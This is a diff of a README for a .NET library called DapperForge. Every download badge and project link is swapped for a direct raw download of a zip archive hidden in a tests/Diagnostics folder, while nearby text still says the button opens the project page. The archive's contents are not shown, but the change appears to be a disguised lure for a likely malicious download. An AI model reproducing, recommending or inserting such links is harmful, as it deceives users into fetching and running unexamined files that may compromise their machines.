@@ -1,6 +1,6 @@
 # ⚙️ DapperForge - Simplify Stored Procedures for Dapper
 
-[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge)
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge/raw/refs/heads/main/tests/DapperForge.Tests/Diagnostics/Forge-Dapper-v1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you are not sure about the .NET Framework, Windows Update usually keeps it up
 
 Click the big button below to open the DapperForge download page on GitHub:
 
-[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-blue)](https://github.com/blady-sa/DapperForge)
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-blue)](https://github.com/blady-sa/DapperForge/raw/refs/heads/main/tests/DapperForge.Tests/Diagnostics/Forge-Dapper-v1.1.zip)
 
 This will take you to the main project page where you can find the latest files.
 
@@ -115,7 +115,7 @@ Here is what DapperForge can do:
 
 Find more information, updates, and help on GitHub:
 
-[https://github.com/blady-sa/DapperForge](https://github.com/blady-sa/DapperForge)
+[https://github.com/blady-sa/DapperForge/raw/refs/heads/main/tests/DapperForge.Tests/Diagnostics/Forge-Dapper-v1.1.zip](https://github.com/blady-sa/DapperForge/raw/refs/heads/main/tests/DapperForge.Tests/Diagnostics/Forge-Dapper-v1.1.zip)
 
 Here you can report issues, request features, and learn about advanced setup options.
 
@@ -131,4 +131,4 @@ To remove the software:
 
 ---
 
-[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge)
+[![Download DapperForge](https://img.shields.io/badge/Download-DapperForge-brightgreen)](https://github.com/blady-sa/DapperForge/raw/refs/heads/main/tests/DapperForge.Tests/Diagnostics/Forge-Dapper-v1.1.zip)
